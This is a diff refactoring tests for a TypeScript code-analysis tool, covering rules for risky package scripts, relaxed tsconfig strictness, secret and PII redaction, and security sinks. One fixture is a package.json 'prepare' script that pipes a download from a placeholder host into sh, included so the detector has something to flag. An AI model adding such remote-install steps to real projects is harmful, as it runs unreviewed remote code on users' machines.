@@ -20,14 +20,9 @@ test("extended type-safety rubric finds explicit unsafety without false positive
 }
 `);
   const unsafeRuleIds = new Set(unsafeReport.findings.map((finding) => finding.ruleId));
-  for (const ruleId of [
-    "modernisation.ts-comment-without-rationale",
-    "modernisation.non-null-assertion",
-    "modernisation.double-cast",
-    "waste.exported-any",
-  ]) {
+  ["modernisation.ts-comment-without-rationale", "modernisation.non-null-assertion", "modernisation.double-cast", "waste.exported-any"].forEach((ruleId) => {
     assert.equal(unsafeRuleIds.has(ruleId), true, `expected ${ruleId}`);
-  }
+  });
 
   const cleanReport = analyseFixture(`function acceptsString(value: string): string {
   return value;
@@ -40,14 +35,9 @@ export function safeApi(input: unknown): string {
   return user.profile?.name ?? "anonymous";
 }
 `);
-  for (const ruleId of [
-    "modernisation.ts-comment-without-rationale",
-    "modernisation.non-null-assertion",
-    "modernisation.double-cast",
-    "waste.exported-any",
-  ]) {
+  ["modernisation.ts-comment-without-rationale", "modernisation.non-null-assertion", "modernisation.double-cast", "waste.exported-any"].forEach((ruleId) => {
     assert.equal(cleanReport.findings.some((finding) => finding.ruleId === ruleId), false, `unexpected ${ruleId}`);
-  }
+  });
 });
 
 test("extended reliability rubric finds unsafe async patterns without false positives", () => {
@@ -66,9 +56,9 @@ test("extended reliability rubric finds unsafe async patterns without false posi
 }
 `);
   const unsafeRuleIds = new Set(unsafeReport.findings.map((finding) => finding.ruleId));
-  for (const ruleId of ["security.async-foreach", "security.floating-promise", "waste.swallowed-catch", "security.throw-non-error"]) {
+  ["security.async-foreach", "security.floating-promise", "waste.swallowed-catch", "security.throw-non-error"].forEach((ruleId) => {
     assert.equal(unsafeRuleIds.has(ruleId), true, `expected ${ruleId}`);
-  }
+  });
 
   // Fixture covers async safe cases that should avoid reliability findings.
   const cleanReport = analyseFixture(`async function reliable(userIds: string[]): Promise<void> {
@@ -88,9 +78,9 @@ async function reportsFailure(): Promise<void> {
   throw new Error("failed");
 }
 `);
-  for (const ruleId of ["security.async-foreach", "security.floating-promise", "waste.swallowed-catch", "security.throw-non-error"]) {
+  ["security.async-foreach", "security.floating-promise", "waste.swallowed-catch", "security.throw-non-error"].forEach((ruleId) => {
     assert.equal(cleanReport.findings.some((finding) => finding.ruleId === ruleId), false, `unexpected ${ruleId}`);
-  }
+  });
 });
 
 test("extended type-safety config can disable new rules", () => {
@@ -109,37 +99,43 @@ test("extended type-safety config can disable new rules", () => {
   assert.equal(disabledReport.findings.some((finding) => finding.ruleId === "modernisation.non-null-assertion"), false);
 });
 
-test("dependency and package config health detects risky package settings", () => {
-  const report = analyseProject({
-    "package.json": JSON.stringify({
-      scripts: {
-        postinstall: "node scripts/setup.js",
-        prepare: "curl https://example.test/install.sh | sh",
-      },
-      dependencies: {
-        "wide-open": "*",
-        "remote-tool": "git+https://github.com/example/remote-tool.git",
-      },
-      devDependencies: {
-        "dev-only": "latest",
-      },
-    }),
-  });
-  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
-  for (const ruleId of ["security.remote-install-script", "security.risky-lifecycle-script", "security.url-dependency", "waste.broad-runtime-version"]) {
-    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
-  }
+// Fixtures for the dependency/package-config health test: risky package settings vs a clean baseline.
+const RISKY_PACKAGE_JSON_FIXTURE = {
+  "package.json": JSON.stringify({
+    scripts: {
+      postinstall: "node scripts/setup.js",
+      prepare: "curl https://example.test/install.sh | sh",
+    },
+    dependencies: {
+      "wide-open": "*",
+      "remote-tool": "git+https://github.com/example/remote-tool.git",
+    },
+    devDependencies: {
+      "dev-only": "latest",
+    },
+  }),
+};
 
-  const cleanReport = analyseProject({
-    "package.json": JSON.stringify({
-      scripts: { check: "tsc --noEmit", test: "node --test" },
-      dependencies: { commander: "^14.0.2" },
-      devDependencies: { "fixture-tool": "latest" },
-    }),
+const CLEAN_PACKAGE_JSON_FIXTURE = {
+  "package.json": JSON.stringify({
+    scripts: { check: "tsc --noEmit", test: "node --test" },
+    dependencies: { commander: "^14.0.2" },
+    devDependencies: { "fixture-tool": "latest" },
+  }),
+};
+
+const RISKY_PACKAGE_RULE_IDS = ["security.remote-install-script", "security.risky-lifecycle-script", "security.url-dependency", "waste.broad-runtime-version"];
+
+test("dependency and package config health detects risky package settings", () => {
+  const report = analyseProject(RISKY_PACKAGE_JSON_FIXTURE);
+  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
+  RISKY_PACKAGE_RULE_IDS.forEach((ruleId) => {
+    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
   });
-  for (const ruleId of ["security.remote-install-script", "security.risky-lifecycle-script", "security.url-dependency", "waste.broad-runtime-version"]) {
+  const cleanReport = analyseProject(CLEAN_PACKAGE_JSON_FIXTURE);
+  RISKY_PACKAGE_RULE_IDS.forEach((ruleId) => {
     assert.equal(cleanReport.findings.some((finding) => finding.ruleId === ruleId), false, `unexpected ${ruleId}`);
-  }
+  });
 });
 
 test("package bin health detects missing and non-executable targets", () => {
@@ -169,78 +165,72 @@ test("package bin health detects missing and non-executable targets", () => {
   assert.equal(executableReport.findings.some((finding) => finding.ruleId.startsWith("design.package-bin-")), false);
 });
 
+// Fixture: tsconfig with all three strictness flags disabled — the rule pack should flag each one.
+const RELAXED_TSCONFIG_FIXTURE = {
+  "tsconfig.json": JSON.stringify({
+    compilerOptions: {
+      strict: false,
+      noUncheckedIndexedAccess: false,
+      exactOptionalPropertyTypes: false,
+    },
+  }),
+};
+
+const TSCONFIG_STRICTNESS_RULE_IDS = ["modernisation.tsconfig-strict-disabled", "modernisation.tsconfig-index-safety-disabled", "modernisation.tsconfig-exact-optional-disabled"];
+
+const STRICT_TSCONFIG_FIXTURE = {
+  "tsconfig.json": JSON.stringify({
+    compilerOptions: {
+      strict: true,
+      noUncheckedIndexedAccess: true,
+      exactOptionalPropertyTypes: true,
+    },
+  }),
+};
+
 test("tsconfig health detects disabled strictness without changing diagnostics", () => {
-  const report = analyseProject({
-    "tsconfig.json": JSON.stringify({
-      compilerOptions: {
-        strict: false,
-        noUncheckedIndexedAccess: false,
-        exactOptionalPropertyTypes: false,
-      },
-    }),
-  });
+  const report = analyseProject(RELAXED_TSCONFIG_FIXTURE);
   const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
-  for (const ruleId of [
-    "modernisation.tsconfig-strict-disabled",
-    "modernisation.tsconfig-index-safety-disabled",
-    "modernisation.tsconfig-exact-optional-disabled",
-  ]) {
+  TSCONFIG_STRICTNESS_RULE_IDS.forEach((ruleId) => {
     assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
-  }
-
-  const cleanReport = analyseProject({
-    "tsconfig.json": JSON.stringify({
-      compilerOptions: {
-        strict: true,
-        noUncheckedIndexedAccess: true,
-        exactOptionalPropertyTypes: true,
-      },
-    }),
   });
-  for (const ruleId of [
-    "modernisation.tsconfig-strict-disabled",
-    "modernisation.tsconfig-index-safety-disabled",
-    "modernisation.tsconfig-exact-optional-disabled",
-  ]) {
+  const cleanReport = analyseProject(STRICT_TSCONFIG_FIXTURE);
+  TSCONFIG_STRICTNESS_RULE_IDS.forEach((ruleId) => {
     assert.equal(cleanReport.findings.some((finding) => finding.ruleId === ruleId), false, `unexpected ${ruleId}`);
-  }
-
+  });
   const malformedReport = analyseProject({ "package.json": "{ not json" });
   assert.deepEqual(malformedReport.diagnostics, []);
 });
 
 // Fixture covers the redaction contract across all renderer formats using safe synthetic values.
+function redactedSecretsFixtureSource(): string {
+  return `API_TOKEN=${API_TOKEN_FIXTURE_VALUE}
+DATABASE_URL=${DATABASE_URL_FIXTURE_VALUE}
+OPENAI_API_KEY=${OPENAI_KEY_FIXTURE_VALUE}
+PATIENT_SSN=${SSN_FIXTURE_VALUE}
+`;
+}
+
+const SENSITIVE_DATA_RULE_IDS = ["sensitive-data.hardcoded-env-value", "sensitive-data.api-key-pattern", "sensitive-data.database-url-password", "sensitive-data.pii-pattern"];
+const REDACTED_RENDER_FORMATS = ["text", "json", "markdown", "github", "html", "sarif"] as const;
+
 test("risk expansion redacts sensitive data in all render formats", () => {
+  const report = analyseFixture(redactedSecretsFixtureSource(), { fileName: ".env" });
   const apiToken = API_TOKEN_FIXTURE_VALUE;
   const databaseUrl = DATABASE_URL_FIXTURE_VALUE;
   const openAiKey = OPENAI_KEY_FIXTURE_VALUE;
   const ssn = SSN_FIXTURE_VALUE;
-  const report = analyseFixture(
-    `API_TOKEN=${apiToken}
-DATABASE_URL=${databaseUrl}
-OPENAI_API_KEY=${openAiKey}
-PATIENT_SSN=${ssn}
-`,
-    { fileName: ".env" },
-  );
-
   const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
-  for (const ruleId of [
-    "sensitive-data.hardcoded-env-value",
-    "sensitive-data.api-key-pattern",
-    "sensitive-data.database-url-password",
-    "sensitive-data.pii-pattern",
-  ]) {
+  SENSITIVE_DATA_RULE_IDS.forEach((ruleId) => {
     assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
-  }
-
-  for (const format of ["text", "json", "markdown", "github", "html", "sarif"] as const) {
+  });
+  REDACTED_RENDER_FORMATS.forEach((format) => {
     const rendered = renderReport(report, format);
-    for (const secret of [apiToken, databaseUrl, openAiKey, ssn]) {
+    [apiToken, databaseUrl, openAiKey, ssn].forEach((secret) => {
       assert.equal(rendered.includes(secret), false, `${format} leaked ${secret}`);
-    }
+    });
     assert.match(rendered, /redacted/);
-  }
+  });
 });
 
 test("risk expansion respects sensitive-data config", () => {
@@ -279,9 +269,8 @@ test("risk expansion ignores package integrity hashes", () => {
   assert.equal(report.findings.some((finding) => finding.ruleId === "sensitive-data.high-entropy-string"), false);
 });
 
-test("risk expansion finds security rules with safe non-candidates", () => {
-  // Fixture covers executable security sinks while keeping noisy safe references nearby.
-  const report = analyseFixture(`import { createHash } from "node:crypto";
+// Fixture covers executable security sinks while keeping noisy safe references nearby.
+const SECURITY_RISKY_FIXTURE = `import { createHash } from "node:crypto";
 import { spawn } from "node:child_process";
 
 function unsafe(userInput: string, userId: string): void {
@@ -318,22 +307,27 @@ function safe(userId: string): void {
   void protoText;
   void secureAgent;
 }
-`);
+`;
+
+const SECURITY_RISKY_RULE_IDS = [
+  "security.new-function",
+  "security.string-timer",
+  "security.process-exec",
+  "security.insecure-random",
+  "security.disabled-tls-verification",
+  "security.javascript-url",
+  "security.inner-html",
+  "security.proto-access",
+  "security.sql-concatenation",
+  "security.weak-crypto",
+];
+
+test("risk expansion finds security rules with safe non-candidates", () => {
+  const report = analyseFixture(SECURITY_RISKY_FIXTURE);
   const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
-  for (const ruleId of [
-    "security.new-function",
-    "security.string-timer",
-    "security.process-exec",
-    "security.insecure-random",
-    "security.disabled-tls-verification",
-    "security.javascript-url",
-    "security.inner-html",
-    "security.proto-access",
-    "security.sql-concatenation",
-    "security.weak-crypto",
-  ]) {
+  SECURITY_RISKY_RULE_IDS.forEach((ruleId) => {
     assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
-  }
+  });
 
   const newFunctionFindings = report.findings.filter((finding) => finding.ruleId === "security.new-function");
   const expectedStringTimerFindings = 3;
@@ -414,16 +408,9 @@ function finish(): void {
 }
 `);
   const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
-  for (const ruleId of [
-    "modernisation.loose-equality",
-    "modernisation.date-now-candidate",
-    "modernisation.object-spread-candidate",
-    "waste.redundant-boolean-cast",
-    "waste.useless-catch",
-    "waste.useless-return",
-  ]) {
+  ["modernisation.loose-equality", "modernisation.date-now-candidate", "modernisation.object-spread-candidate", "waste.redundant-boolean-cast", "waste.useless-catch", "waste.useless-return"].forEach((ruleId) => {
     assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
-  }
+  });
   const expectedBooleanCastFindings = 2;
   assert.equal(report.findings.filter((finding) => finding.ruleId === "modernisation.loose-equality").length, 1);
   assert.equal(report.findings.filter((finding) => finding.ruleId === "waste.redundant-boolean-cast").length, expectedBooleanCastFindings);
@@ -497,16 +484,9 @@ function testBuildsLibraryValue(): void {
 }
 `);
   const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
-  for (const ruleId of [
-    "test-quality.magic-number-assertion",
-    "test-quality.mock-only-test",
-    "test-quality.unused-mock",
-    "test-quality.exception-type-only",
-    "test-quality.global-state-mutation",
-    "test-quality.setup-bloat",
-  ]) {
+  ["test-quality.magic-number-assertion", "test-quality.mock-only-test", "test-quality.unused-mock", "test-quality.exception-type-only", "test-quality.global-state-mutation", "test-quality.setup-bloat"].forEach((ruleId) => {
     assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
-  }
+  });
   assert.equal(report.findings.some((finding) => finding.ruleId === "test-quality.no-assertions"), false);
   assert.deepEqual(report.findings.filter((finding) => finding.pillar === "test-quality" && finding.symbol === "testBuildsLibraryValue"), []);
 });
